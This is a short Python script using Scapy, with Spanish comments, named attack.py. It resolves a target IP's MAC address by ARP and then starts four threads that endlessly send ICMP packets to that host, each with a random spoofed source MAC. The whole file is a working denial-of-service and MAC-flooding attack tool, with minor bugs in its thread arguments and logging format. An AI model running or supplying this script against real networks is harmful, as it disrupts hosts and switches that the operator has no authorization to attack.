#! /usr/bin/python

from scapy.all import *
from os import popen
import threading
import logging
import sys

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] (%(threadname)-s) %(message)s')

def arp_ping(IP_target):
	Mac = ""
	Timeout=2		    
	answered,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP_target),timeout=Timeout,verbose=False)
	answered.show()
	unanswered.show()
	if len(answered) > 0:
	    print (answered[0][0].getlayer(ARP).pdst, "is up \n")
	    Mac = answered[0][1].getlayer(ARP).hwsrc #direccion MAC encontrada con ARP.
	elif len(unanswered) > 0:
	    print (unanswered[0].getlayer(ARP).pdst, "is down \n")
	return Mac


def attack(Packet):
	interface = popen('ifconfig | awk \'/eth0/ {print$1}\'').read()
	print('phisic port:',interface) #rstrip function removes any trailing characters.
	while 1 == 1:
		mac = RandMAC()
		Packet['Ether'].src = mac 
		sendp(Packet,iface=interface.rstrip(),verbose=False)
		#srp(Packet,timeout=0.1,verbose=False) ,inter=0.000001 
		#print("source mac: ", mac)


if __name__ == '__main__':
	if len(sys.argv) != 2:
	    print ("Usage: attack.py IP    -   falta el parametro IP al ejecutar")
	    sys.exit(1)

	Mac = arp_ping(sys.argv[1]) #retorna la MAC del dispositivo que posee la IP pasada por parametro

	if Mac != "":
		SrcMAC = ""	
		DstMac = Mac
		DstIP = sys.argv[1]
		conf.checkIPaddr = False
		Packet = Ether(dst=DstMac)/IP(dst=DstIP)/ICMP()

		t1 = threading.Thread(name="random1", target=attack, args=(Packet))
		t2 = threading.Thread(name="random2", target=attack, args=(Packet))
		t3 = threading.Thread(name="random3", target=attack, args=(Packet))
		t4 = threading.Thread(name="random4", target=attack, args=(Packet))

		t1.start()
		t2.start()
		t3.start()
		t4.start()
		
														

